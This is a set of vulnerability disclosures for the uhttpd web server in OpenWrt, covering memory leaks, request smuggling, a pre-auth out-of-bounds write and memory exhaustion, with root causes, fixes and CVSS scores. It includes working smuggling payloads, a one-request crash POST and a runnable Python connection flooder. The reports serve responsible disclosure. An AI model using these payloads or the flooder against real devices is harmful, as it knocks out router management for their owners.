summary: uhttpd: leaked client refcount on /ubus/subscribe/ — permanent listener wedge
description:
## Summary

`uh_ubus_handle_get_subscribe()` takes a client reference and never releases it on the success
path. `uh_client_unref()` is reached only via `err_unref`/`err_unregister`, so after a successful
subscribe `cl->refcount` stays ≥1 forever.

```c
uh_client_ref(cl);
err = ubus_register_subscriber(ctx, &du->sub);
...
cl->dispatch.free = uh_ubus_subscription_free;
return;                    /* no uh_client_unref() */
err_unregister:
        ubus_unregister_subscriber(ctx, &du->sub);
err_unref:
        uh_client_unref(cl);
```

When the peer disconnects, `client_close()` takes its early-return branch permanently:

```c
if (cl->refcount) {
        cl->state = CLIENT_STATE_CLEANUP;
        return;
}
...
uh_dispatch_done(cl);
```

So `n_clients` is never decremented, the fd is never closed, `cl` is never freed, and
`uh_dispatch_done()` → `uh_ubus_subscription_free()` **never runs** — commit `506e249`
("unregister ubus subscriber on HTTP client disconnect") is dead code on exactly the path it was
written for, and the ubus subscriber leaks in the global context.

## Impact

`conf.max_connections` defaults to 100. After 100 subscribe-then-disconnect requests
`uh_block_listeners()` stops uhttpd accepting anything — persistent HTTP DoS until restart.

Reproduced with `uhttpd -N 3`:

```
baseline before subscribes:  probe0: b'HTTP/1.1 200 OK\r\nCon'
  subscribe #1..#3 sent and disconnected
after 3 subscribe+disconnect (N=3):  probe1: FAILED timed out
VERDICT: *** LISTENER WEDGED - permanent DoS ***
```

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H   -> 6.5 Moderate
```

## Reachability — stated precisely

Gated by `uh_ubus_allowed(sid, path, ":subscribe")`. rpcd's `unauthenticated.json` grants the null
session only `session.access` / `session.login`, so on a stock box this is **post-auth**: it needs
any session whose ACL grants the object, or `ubus_noauth`. I used `-a` to reach the handler in the
reproducer above.

**However** — `uh_ubus_allowed()` fnmatches the method as the subject against the ACL pattern, so
an ACL granting `["*"]` for an object also grants `:subscribe`. Enumerating the LuCI feed, 13
ACLs do this, and one of them — `luci-app-olsr-unauthenticated.json` — grants it to the
**`unauthenticated`** group:

```json
"unauthenticated": { "read": { "ubus": { "luci-rpc": [ "*" ] } } }
```

With `luci-app-olsr` installed, `GET /ubus/subscribe/luci-rpc` wedges the listener **pre-auth**.
That is a non-default package so I am not scoring on it, but it is worth knowing that `["*"]`
method grants silently include `:subscribe`.

## Note for whoever fixes it

`506e249`'s SIGSEGV fix is currently load-bearing **because** of this leak — the client is never
freed, so the stale subscriber cannot use-after-free. Adding the missing unref without keeping
`dispatch.free` reachable would reintroduce that crash.

summary: uhttpd: unauthenticated unbounded memory growth — du->url_path leaked on every non-POST /ubus request
description:
## Summary

`uh_ubus_handle_request()` does `du->url_path = strdup(url)` for every method, but only the POST
branch installs `d->free = uh_ubus_request_free` — the only thing that frees it. Every other
branch reaches `ops->request_done()` → `uh_request_done()` →
`memset(&cl->dispatch, 0, sizeof(cl->dispatch))`, which **NULLs `du->url_path` without freeing
it**. The trailing `free(du->url_path)` at the end of the function then frees NULL.

Leak is `strlen(request-target) + 1` per request, bounded per request only by the 4096-byte
ustream buffer, and unbounded in aggregate — one keep-alive socket loops it. No authentication.

## Affected paths

```
GET /ubus/AAAA…(3900 A's) HTTP/1.1     (404 branch)
GET /ubus/list                          (200 branch)
OPTIONS /ubus
HEAD /ubus                              (400 via uh_client_error)
```

`GET /ubus/subscribe/<path>` is the one non-POST path that does **not** leak — it returns without
calling `request_done()`, so the trailing `free()` runs on a live pointer.

## Measurement

Same pid throughout, ASan build:

```
RSS start = 8560 kB
sent 5000 requests (~18.6 MB of raw leak)
RSS end  = 35836 kB      delta = +27.3 MB
```

## Impact

Remote unauthenticated OOM of uhttpd, and on a small router of the box. The `/ubus/list` variant
needs no valid object and no session at all.

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H   -> 7.5 High
```

## Not a duplicate

`GHSA-vhx4-3p5q-m59q` is also a memory-exhaustion DoS, but it is header accumulation into
`cl->hdr` — bounded per connection by the blob length mask and reclaimed when the connection
closes. This leak is permanent for the life of the process and is driven by the request target,
not by headers. Different allocation, different lifetime, different fix.

## Fix

Free `url_path` on all non-POST paths, or set `d->free` unconditionally.

cwes.name: Missing Release of Memory after Effective Lifetime

summary: uhttpd: pre-auth HTTP request smuggling (CL.0) — keep-alive connection reused with an unread request body
description:
## Summary

`uh_request_done()` returns a connection to `CLIENT_STATE_INIT` for keep-alive reuse without
checking whether the request body was consumed. `client_poll_post_data()` bails out early for
every handler that does not consume body data, so an unauthenticated client can send **one**
well-formed HTTP/1.1 message whose body the server parses as a **second** request.

No authentication, no ACL, no non-default option. It fires on a plain `GET /`.

## Affected code

`client.c`, unchanged in substance since 2013 and byte-identical in `f682cca` (HEAD) and
`7b1bec45` (OpenWrt's pin):

```c
void uh_request_done(struct client *cl)
{
        uh_chunk_eof(cl);
        uh_dispatch_done(cl);
        blob_buf_init(&cl->hdr_response, 0);
        memset(&cl->dispatch, 0, sizeof(cl->dispatch));

        if (!conf.http_keepalive || cl->request.connection_close)
                return uh_connection_close(cl);

        cl->state = CLIENT_STATE_INIT;   /* reuse: body may still be buffered */
        cl->requests++;
        uh_poll_connection(cl);
}
```

The body is left behind here:

```c
buf = ustream_get_read_buf(cl->us, &len);
if (!buf || !len)
        break;

if (!d->data_send)
        return;          /* body left in the ustream, unconsumed */
```

`d->data_send` is set in exactly two places tree-wide — `ubus.c` (POST to `/ubus`) and `proc.c`
(CGI). Every other handler leaves it NULL: static files, HEAD, directory listings,
304/precondition, and `GET`/`OPTIONS /ubus`.

`uh_client_error()` already has the guard, and its comment describes precisely the bug the
success path has:

```c
/* Close the connection even when keep alive is set, when it contains a request
 * body, as it was not read and we are currently out of sync. Without handling
 * this the body will be interpreted as part of the next request. */
if (r->transfer_chunked || r->content_length > 0)
        cl->request.connection_close = true;
```

Keep-alive is on by default (`http_keepalive = 20`).

## Reproducer

One well-formed HTTP/1.1 message; the 38-byte body is unambiguously a body:

```
GET /index.html HTTP/1.1\r\nHost: a\r\nContent-Length: 38\r\n\r\nGET /POISON.html HTTP/1.1\r\nHost: a\r\n\r\n
```

```
[A] 1 message w/ 38-byte body -> responses: ['200', '404']
    *** DESYNC (body executed as request) ***
```

Appending one innocent request shows the queue offset, which persists for the life of the
connection:

```
[B] 2 messages (poisoned + victim) -> responses: ['200', '404', '200']
    *** 3 responses for 2 messages = queue offset ***
```

## Affected set — measured

The split falls exactly along `uh_request_done()` vs `uh_client_error()`, which is the strongest
confirmation of the root cause:

```
via uh_request_done()  (success path, UNGUARDED):
  GET /index.html (200)      -> 2 resp ['200','404']   *** DESYNC ***
  HEAD /index.html           -> 2 resp ['200','404']   *** DESYNC ***
  GET /  (index)             -> 2 resp ['200','404']   *** DESYNC ***
  GET /ubus/bogus (ubus 404) -> 2 resp ['404','404']   *** DESYNC ***
  GET /ubus/list  (200)      -> 2 resp ['200','404']   *** DESYNC ***
  OPTIONS /ubus              -> 2 resp ['200','404']   *** DESYNC ***

via uh_client_error()  (ALREADY guarded):
  GET /nonexistent.html      -> connection reset       guarded, no desync
```

Note the asymmetry: the **file handler's** 404 goes through `uh_client_error()` and is safe,
while **ubus's own** 404 calls `ops->request_done()` directly and desyncs. "Error responses are
safe" is not a valid summary — only the paths routed through `uh_client_error()` are.

`Transfer-Encoding: chunked` works in place of `Content-Length`: with `data_send` NULL the chunked
body is never framed at all.

## Impact

Textbook CL.0 desync.

- Behind any reverse proxy that reuses upstream connections → cross-client request smuggling and
  response-queue poisoning.
- Directly exposed → the attacker desynchronises their own connection and any pipelined request
  on it gets the wrong response.

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N   -> 5.3 Moderate
```

Deliberately conservative: I demonstrated the direct-connection case only. In the proxy-fronted
deployment this class normally implies (`S:C/C:H/I:H`, ≈9.x), severity is far higher, but I did
not build that setup so I am not scoring it.

## Not a duplicate

Each published advisory patches a different branch of the same class and left the plain success
path untouched:

| Advisory | Root cause | Overlap |
|---|---|---|
| `GHSA-p55c-rmhc-qfm5` (CVE-2026-55612) | invalid chunk-length state reset | none — no chunked encoding needed here |
| `GHSA-mcfg-c4r7-pjpf` (CVE-2026-55614) | case-sensitive `Transfer-Encoding` | none — plain `Content-Length` |
| `GHSA-wgwp-64hh-f52p` (CVE-2026-55613) | ubus POST body parse-error desync | none — no `/ubus`, no POST, no parse error |
| `GHSA-vhx4-3p5q-m59q` | header-accumulation memory DoS | none |

I audited a tree with all of the above applied, including the new `CHUNKED_TRAILER` state
machine, and ran a 9-case byte-level battery against the trailer work specifically — it is
correct. This is a path it never covered.

## Fix

Move the guard out of `uh_client_error()` into `uh_request_done()`:

```c
if (r->transfer_chunked || r->content_length > 0)
        cl->request.connection_close = true;
```

No-op for genuine pipelining (a drained body leaves both zero), and it makes the copy in
`uh_client_error()` redundant.

summary: uhttpd: unauthenticated out-of-bounds write via `params` type confusion in POST /ubus/call/
description:
## Summary

`uhttpd`'s JSON-RPC policy accepts `params` as **any** blobmsg type, but the REST endpoint
`POST /ubus/call/<object>` hands the raw attribute to `uh_ubus_send_request()`, which iterates
it as if it were a container. A scalar `params` makes the iterator reinterpret 4 bytes of
attacker-controlled payload as a `struct blob_attr` header. The resulting length underflows to
`SIZE_MAX`-class, is truncated to `unsigned int` by `blobmsg_add_field()`, and reaches
`memcpy()` as `0xFFFFFFFD`.

One HTTP POST, **no credentials**, kills the daemon.

## Affected code

`ubus.c` — byte-identical between `f682cca` (HEAD) and `7b1bec45` (the commit OpenWrt currently
packages), so current OpenWrt is affected exactly as HEAD is.

```c
[RPC_PARAMS] = { .name = "params", .type = BLOBMSG_TYPE_UNSPEC },   /* accepts anything */
```

`parse_json_rpc()` copies the attribute verbatim with `blob_memdup()`, `uh_ubus_call()` passes it
straight through, and `uh_ubus_send_request()` assumes a container:

```c
blobmsg_for_each_attr(cur, args, rem) {
        if (!strcmp(blobmsg_name(cur), "ubus_rpc_session"))
                return uh_ubus_json_rpc_error(cl, ERROR_PARAMS);
        blobmsg_add_blob(&req, cur);
}
```

## The primitive

With `"params": 1` the attribute is a 20-byte `BLOBMSG_TYPE_INT32`. `blobmsg_data_len()` is 4, so
the loop guard `rem >= sizeof(struct blob_attr)` passes and the payload bytes `00 00 00 01` are
read as an attribute header:

- `id_len == 1` ⇒ `blob_len(cur)` = `1 - sizeof(struct blob_attr)` underflows; `blobmsg_data_len(cur)`
  becomes `~0xFFFF…FFFD`.
- `blobmsg_name(cur)` is `blob_data(cur) + 2`, **2 bytes past the 20-byte allocation** — the
  `strcmp` above is already an out-of-bounds read.
- `blobmsg_add_blob()` → `blobmsg_add_field(..., unsigned int len)` truncates the `size_t` to
  `4294967293` and runs `memcpy(data_dest, data, len)`.

The behaviour across the whole input range is deterministic and matches the arithmetic exactly:
`params` values whose low 24 bits are **1–3** give the giant `memcpy`; **4** gives the
out-of-bounds read only; **≥5** fails `blob_pad_len(pos) <= rem` and is filtered; **0** fails
`blob_pad_len(pos) >= sizeof(struct blob_attr)`.

## Why it is unauthenticated

`uh_ubus_get_auth()` returns `UH_UBUS_DEFAULT_SID` — the null session
`00000000000000000000000000000000` — when no `Authorization: Bearer` header is present. rpcd
grants that session the `unauthenticated` ACL group unconditionally (`session.c`, returns true
for the group name when no login section exists), and `rpcd/unauthenticated.json` gives it
`session: ["access", "login"]`. So `uh_ubus_allowed(sid, "session", "login")` **passes** and
control reaches the vulnerable loop.

Confirmed live: a well-formed `login` with a wrong password returns
`{"code":6,"message":"Permission denied"}` — rpcd's own login handler answered, so the ACL gate
was cleared, not bypassed.

`/ubus/call/...` is served whenever `ubus_prefix` is set, which is the stock LuCI configuration
(`files/ubus.default` sets `ubus_prefix=/ubus`).

## Reproducer

One POST, zero credentials:

```http
POST /ubus/call/session HTTP/1.1
Host: 192.168.1.1
Content-Type: application/json
Content-Length: 51

{"jsonrpc":"2.0","id":1,"method":"login","params":1}
```

### ASan — the read

```
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1 at 0x7005f89e0296
    #0 strcmp
    #1 uh_ubus_send_request   ubus.c:574
    #2 uh_ubus_call           ubus.c:890
    #3 uh_ubus_handle_post    ubus.c:922
    #4 client_poll_post_data  client.c:674
   #11 uloop_run_events       libubox/uloop.c:255

0x7005f89e0296 is located 2 bytes after 20-byte region [0x7005f89e0280,0x7005f89e0294)
allocated by thread T0 here:
    #1 blob_memdup            libubox/blob.c:343
    #2 parse_json_rpc         ubus.c:713
```

### ASan — the write (`-fsanitize-recover=address` to continue past the read)

```
WRITE of size 4294967293 at 0x77ad9c1e0a00 thread T0
    #0 memcpy
    #2 blobmsg_add_field      libubox/blobmsg.c:412
    #3 uh_ubus_send_request   ubus.c:576
    #4 uh_ubus_call           ubus.c:890

ERROR: AddressSanitizer: SEGV on unknown address 0x77ad9c220000
The signal is caused by a WRITE memory access.
```

### Non-sanitised build — the shipped behaviour

Same stack rebuilt with plain `-O2 -g`, same single request:

```
alive before : True
alive after  : False
uhttpd exited rc=139   (SIGSEGV)
```

## Impact

**Demonstrated:** an unauthenticated remote attacker sends one HTTP POST and uhttpd dies with
SIGSEGV, taking down the entire web management plane. procd respawns it, but the request can be
repeated at will, so this is a sustained denial of service.

**Not demonstrated:** controlled corruption. The primitive is a linear ~4 GiB heap write whose
source bytes are attacker-influenced, which plausibly supports more than a crash — but I did not
build a controlled-corruption or code-execution PoC, so I do not score confidentiality or
integrity impact.

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H   -> 7.5 High
```

`AC:L` because the single request is deterministic and reproduced on every attempt. If you want
the score re-derived above `A:H`, a controlled-corruption PoC is the work required and I have not
done it.

## Not a duplicate

Distinct from all four published uhttpd advisories, which are all in `client.c` HTTP framing:
`GHSA-vhx4-3p5q-m59q` (header accumulation), `GHSA-wgwp-64hh-f52p` (ubus POST body parse-error
desync — that one is `uh_ubus_data_send()` and does not involve `params`, `blobmsg_add_blob`,
`uh_ubus_send_request` or `blobmsg_add_field`), `GHSA-p55c-rmhc-qfm5` and `GHSA-mcfg-c4r7-pjpf`
(chunk-length and `Transfer-Encoding` smuggling).

The vulnerable loop dates to `3864c08` ("ubus: deny requests with a `ubus_rpc_session` toplevel
attribute") — it was added as a *security* check and never type-guarded; only renamed since
(`212f836`).

## Fix

The legacy/batch path already pins the type: `parse_call_params()` declares slot 3 as
`{ .type = BLOBMSG_TYPE_TABLE }`. `uh_ubus_call()` has no equivalent. One guard in
`uh_ubus_send_request()` covers both callers:

```c
if (args && blobmsg_type(args) != BLOBMSG_TYPE_TABLE)
        return uh_ubus_json_rpc_error(cl, ERROR_PARAMS);
```

Separately worth hardening `blobmsg_add_field()`'s `unsigned int len` in libubox so the next such
caller does not inherit the same primitive — I am reporting that to libubox as its own item.

vulnerabilities.vulnerable_version_range: all revisions up to and including f682ccab (ubus.c byte-identical since 3864c08)

cwes.name: Access of Resource Using Incompatible Type

summary: uhttpd — pre-auth HTTP header-accumulation memory-exhaustion DoS
description:
## Summary

uhttpd's per-request header parser imposes **no cap on header count** and **no cap on cumulative
header bytes** — only a ~4096-byte per-*line* limit. Each parsed header line is appended to a
libubox `blob_buf` (`cl->hdr`) that grows on the heap. A single connection saturates at the libubox
blob length-mask ceiling (~16 MiB), so the realised DoS is the **aggregate** of
`max_connections × ~16 MiB`. With the default `-N 100`, a handful of concurrent keep-alive
connections that stream headers toward the cap (and never send the terminating empty line) exhaust
router RAM and OOM-kill the daemon. Confirmed on a live OpenWrt 25.12.4 lab: **uhttpd OOM-killed 4
times**, peak RSS 319 MiB, `MemAvailable` 378 MiB → 14 MiB, the web-management plane unresponsive.

This is a **default-config, pre-auth, no-auth remote denial of service** of the web-management plane
(LuCI UI + `/ubus` RPC).

## Environment / affected range

- **Component:** uhttpd (`package/network/services/uhttpd`).
- **Hunt corpus:** uhttpd `main` @ `1b624f8f814ed568608d756512892416e0431d77`
  (`PKG_SOURCE_DATE=2026-05-21`), pristine upstream (zero OpenWrt patches) — this is an upstream
  uhttpd bug.
- **Live-validated build:** OpenWrt **25.12.4**, uhttpd **2025.10.03~ebb92e6b-r1** (x86/64, musl),
  binary sha256 `1d69fd5256130cded1ca5d9550e9c5b2b13e24c74572e55ac9782a1b0d7de607`.
- **Affected:** effectively all web-managed OpenWrt installs that ship this uhttpd, **including
  current upstream master `7b1bec4`**; the header-accumulation path is long-standing and
  behaviorally identical across releases. uhttpd sets no `PKG_CPE_ID` (please add one for CVE
  tracking).
- **CWE-400 / CWE-770** (uncontrolled resource consumption / missing limit on resource allocation).

## Topology

The attack rides the LAN; the request is N concurrent connections, each streaming unbounded headers
toward the per-connection blob cap and never sending the terminating empty line.

```
                         LAN segment  br-lan  10.0.2.0/24
                         (fw4 zone lan: input ACCEPT — no auth gate)
  +------------------------+                                    +---------------------------------+
  |  Attacker VM (Debian)  |   N concurrent conns, each         |  OpenWrt target / DUT 25.12.4   |
  |  10.0.2.8              |   streaming unbounded headers      |  10.0.2.2                       |
  |  PoC: exploit_client-002 |  ------------------------------> |  uhttpd -h /www -x /cgi-bin     |
  +------------------------+   pre-auth, no credentials         |         -u /ubus  (+ LuCI/rpc)  |
                                                                +---------------------------------+
       WAN eth1 10.0.3.x  (fw4 zone wan: input REJECT)  -- not used; attack rides the LAN --
```

## Upstream status (checked 2026-06-22)

**Confirmed UNFIXED on upstream master `7b1bec4` (2026-06-22).** There is no header **count** cap
and no cumulative-header-**bytes** cap anywhere in `client.c` / `uhttpd.h`; headers still accrue
uncapped via `blobmsg_add_string(&cl->hdr, …)` at `client.c:450`. The three request-smuggling fixes
landed on master since our hunt corpus (`ae015e0` reject unhandled Transfer-Encoding; `b78f518`
close on invalid chunk length; `7b1bec4` close on POST-body parse error) are unrelated to this
resource-exhaustion defect and do not touch the header-accumulation path.

## Root cause (file:line, from the pre-auth socket)

Call path, looped per header line and terminated only by the empty line (`client.c:371`):

```
socket -> uh_accept_client -> uh_client_read_cb -> client_header_cb
       -> client_parse_header (client.c:364) -> blobmsg_add_string(&cl->hdr, ...) (client.c:442)
```

No auth gate sits in the header-accumulation loop. Per-connection growth is bounded by the libubox
blob ceiling — `blob_buf_grow` refuses to grow once `required > BLOB_ATTR_LEN_MASK - buflen`
(`blob.c:73`, `BLOB_ATTR_LEN_MASK = 0x00ffffff` = ~16 MiB); at the cap `blob_add` returns NULL and
`blobmsg_add_string` fails **gracefully** (no abort, no integer wrap). So a single connection
saturates at ~16 MiB — the DoS is the **aggregate** `max_connections × ~16 MiB`. uhttpd is
single-threaded, so even before OOM the realloc-copying of growing 16 MiB blobs stalls the event
loop.

## Steps to reproduce

Per connection, after the request line, stream many ~4 KB header lines and **never** send the
terminating empty line (hold the connection in the header phase; the network timeout re-arms per
line). Open many such connections concurrently.

```
GET / HTTP/1.1\r\n
Host: 10.0.2.2\r\n
X-Pad-0001: <~4000 bytes of 'A'>\r\n
X-Pad-0002: <~4000 bytes of 'A'>\r\n
...   (~4000 lines reach the ~16 MiB blob cap per connection)
```

PoC (threaded raw-socket flooder + SSH RSS/MemAvailable monitor + a `MemAvailable < 60 MiB` safety
floor so only the fattest process is OOM-reaped and SSH stays alive):

```sh
cd results/uhttpd/exploits/client-002
python3 exploit_client_002_memexhaust.py            # see script header for --mode single|aggregate
```

## Evidence

**Single mode (per-connection 16 MiB plateau):** one connection streaming `X-Pad-NNNNNN` lines drove
uhttpd VmRSS `1712 kB -> 18108 kB (+16.0 MiB)` then **plateaued** (RSS stopped growing while bytes
kept flowing) — confirming `blob_buf_grow` refuses past the 16 MiB length-mask. On close VmRSS
returned to 1708 kB. (`run1_single_client_002.log`.)

**Aggregate mode → real availability loss (the A:H proof):** ~30 concurrent header-accumulating
connections drove peak uhttpd VmRSS 319 MiB, `MemAvailable` 378 MiB → 14 MiB (no swap), and **uhttpd
was OOM-killed 4 times**. Kernel log (`target_client_002.log`):

```
[22805.862227] oom-kill:...task=uhttpd,pid=20465,uid=0
[22805.862227] Out of memory: Killed process 20465 (uhttpd) total-vm:365376kB, anon-rss:363476kB ...
[22814.779763] Out of memory: Killed process 20938 (uhttpd) total-vm:353736kB, anon-rss:351744kB ...
[22825.822403] Out of memory: Killed process 21003 (uhttpd) total-vm:364568kB, anon-rss:362624kB ...
[22835.558738] Out of memory: Killed process 21076 (uhttpd) total-vm:323044kB, anon-rss:321152kB ...
```

**16 legitimate `GET /` probes left unresponsive** during the attack (single-threaded event-loop
stall + OOM windows) = the realised availability loss. (`run2_aggregate_client_002.log`,
`exec_client_002.log`.) The lab has ~483 MiB RAM — **larger** than a typical 64-256 MiB OpenWrt
router — yet OOM still fired; a 64 MiB box OOMs at roughly four saturated connections. Packet
captures: `capture_client_002.pcap`, `capture_client_002_aggregate.pcap`. The lab fully recovered
afterward (`GET / -> 200`, uhttpd respawned by procd).

## Exploit execution

Salient transcript from `exec_client_002.log` — RUN 1 shows the single-connection RSS climb and the
16 MiB plateau; RUN 2 shows the aggregate `MemAvailable` collapse, the unresponsive `GET /` probes,
and the kernel OOM-killing uhttpd by name 4 times:

```
## RUN 1 — SINGLE-CONNECTION growth proof (proves the 16 MiB/conn cap)
[*] lab uhttpd pid=20465  baseline VmRSS=1712 kB
```

## Proof-of-concept (embedded)

Simplified, self-contained aggregate flooder (stdlib only). It opens N concurrent connections, each
streaming ~4 KB header lines and never sending the terminating empty line, so each connection pins a
growing `cl->hdr` blob; the aggregate exhausts router RAM. Faithful to the run above with the
campaign's SSH-monitor and `MemAvailable` safety-floor plumbing stripped — run only against an
isolated lab DUT.

```python
#!/usr/bin/env python3
# uhttpd client-002 — pre-auth header-accumulation memory-exhaustion DoS.
# Opens N concurrent connections, each streams unbounded ~4 KB header lines and
# NEVER sends the terminating empty line, so each cl->hdr blob grows (~16 MiB cap
# per conn); the aggregate OOM-kills uhttpd. Isolated lab only.
import socket, sys, threading, time

TARGET = "10.0.2.2"
PORT   = 80
CONNS  = 30          # concurrent header-streaming connections
PAD    = 4000        # bytes of 'A' per header value (stays under the 4096 line cap)
MAXLN  = 6000        # ~4000 lines reaches the ~16 MiB blob cap per connection

def flood():
    while True:
        try:
            s = socket.create_connection((TARGET, PORT), timeout=6)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.sendall(b"GET / HTTP/1.1\r\nHost: %b\r\n" % TARGET.encode())
            for i in range(MAXLN):                       # NO terminating empty line
                s.sendall(b"X-Pad-%06d: " % i + b"A" * PAD + b"\r\n")
        except OSError:
            time.sleep(0.05)                             # reopen and keep the pressure on

if __name__ == "__main__":
    print("[*] flooding %s:%d with %d header-accumulation conns" % (TARGET, PORT, CONNS))
    for _ in range(CONNS):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(60)
```

## Full artifacts

The complete original exploit script(s) and raw evidence (full logs, pcap, ASan output, any core)
are not inlined here; they can be provided separately to the maintainers by email on request.

## Impact and severity

Remote pre-auth DoS of the web-management plane via OOM / event-loop stall. No memory disclosure, no
integrity violation, no escalation to a write/RCE (the blob cap rejects over-cap growth rather than
wrapping).

**Confirmed:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = **7.5 (High)**.

## Suggested fix

Add a per-request cap on header **count** and on cumulative header **bytes** (reject with `431` /
`413` once exceeded) in `client_parse_header` before `blobmsg_add_string`, and/or a per-connection
header-phase byte budget — so a single connection cannot pin a 16 MiB allocation and the connection
pool cannot aggregate to RAM exhaustion.

summary: HTTP request smuggling via ubus POST body parse-error desync
description:
Location: ubus.c:945, function uh_ubus_data_sendSeverity: Medium (CVSS 3.1 ~5.9)

Description:

When a POST to /ubus delivers the body in multiple TCP segments, thefirst fragment can complete a JSON object ({}), causing du->jsobj tobecome non-NULL. When the next fragment arrives, uh_ubus_data_send() hitsthe existing-object error path: it emits a JSON-RPC parse error and returns0 (zero bytes consumed). The caller does not drain the remaining declaredContent-Length bytes and does not set connection_close, so the unreadbody suffix is parsed as a new HTTP request on the same keep-aliveconnection.

This differs from the two previously reported bugs:

    #1 (TE case-sensitivity) is in HTTP header parsing

    #2 (chunk-length reset) is in chunked transfer-coding handling

    This bug is in the ubus application-layer body handler

Reproduction:

Send a POST to /ubus with Content-Type: application/json andContent-Length covering both a {} prefix and a smuggled GET / HTTP/1.1suffix. Deliver the {} in the first TCP segment, pause briefly (~100ms),then send the remainder. The server returns two responses on the sameconnection: a JSON-RPC parse error and a 200 OK directory listing fromthe smuggled GET.

Suggested fix:

Set connection_close in the ubus parse-error path before callingrequest_done:

 // ubus.c — error path of uh_ubus_data_send():
   cl->request.connection_close = true;

Or have uh_request_done() drain any remaining body bytes whencontent_length > 0.
General notes

    This was found through the same automated static analysis + runtimevalidation methodology as the previous report.

    The /ubus endpoint is enabled by default in OpenWrt, so any standardOpenWrt deployment behind a reverse proxy or CDN is potentially affected.

    I have a complete PoC script (Python, ~130 lines) that builds uhttpd withubus support and demonstrates the two-response output. Attached in the email with some other artifacts.

summary: HTTP request smuggling via invalid chunk-length state reset
description:
Location: client.c:500, function client_poll_post_dataIntroduced: commit b7c85a28 (2013-01-03, "implement proper flow controlfor relaying postdata")Severity: High (CVSS 3.1 ~8.1)

Description:

When client_poll_post_data() encounters an invalid chunk-length line(e.g., a value exceeding INT_MAX), it consumes only the chunk-size line,then clears both r->content_length and r->transfer_chunked to zero.This makes the completion check treat the request as finished. However, theremaining body data is not drained and request.connection_close is notset, so the keep-alive parser re-enters CLIENT_STATE_INIT and parsesthe leftover body bytes as a new HTTP request.

An attacker can embed a complete HTTP request inside the body of a chunkedPOST. By using an oversized hexadecimal chunk-length (e.g., 80000000)that triggers the invalid-chunk branch, the embedded bytes are cleanlyaligned as a valid second request.

Reproduction:

Send a chunked POST with a valid first chunk (1\r\nA\r\n), then anoversized chunk-length line (80000000\r\n), followed by a completeGET /target HTTP/1.1\r\n... embedded in the body. The server respondsto the POST (truncated body A), then processes the embedded GET as aseparate request on the same connection.

Suggested fix:

Force connection close on invalid chunk-length:
```
   r->content_length = 0;
   r->transfer_chunked = 0;
 + cl->request.connection_close = true;
```
Or drain all remaining buffered data before allowing keep-alive reuse.

summary: HTTP request smuggling via case-sensitive Transfer-Encoding matching
description:
Location: client.c:405, function client_parse_headerIntroduced: commit 2bef561c (2013-01-03, "add post data relaying")Severity: High (CVSS 3.1 ~8.1)

Description:

client_parse_header() lowercases header names but compares theTransfer-Encoding value using case-sensitive strcmp(val, "chunked").RFC 9112 §6.1 (formerly RFC 7230 §3.3.1) requires transfer-coding tokensto be compared case-insensitively.

When a client sends Transfer-Encoding: Chunked (mixed case), the headeris accepted but chunked body framing is not enabled (r->transfer_chunkedstays false). On a keep-alive connection, the unread body bytes are thenparsed as the next HTTP request.

Notably, the same function already uses strcasecmp for the Connectionheader value (line 409) — the inconsistency appears to be an oversight.

Reproduction:

Send a POST with Transfer-Encoding: Chunked (capital C) followed by achunked body and a pipelined GET, all on one keep-alive TCP connection.The server returns two responses: one for the POST (with empty body — thechunked data was not consumed) and one generated from the leftover bodybytes being reparsed as a new request.

Suggested fix:
```
 - if (!strcmp(val, "chunked"))
 + if (!strcasecmp(val, "chunked"))
```
Or reject requests with unsupported Transfer-Encoding values (501 perRFC 9112 §6.1).
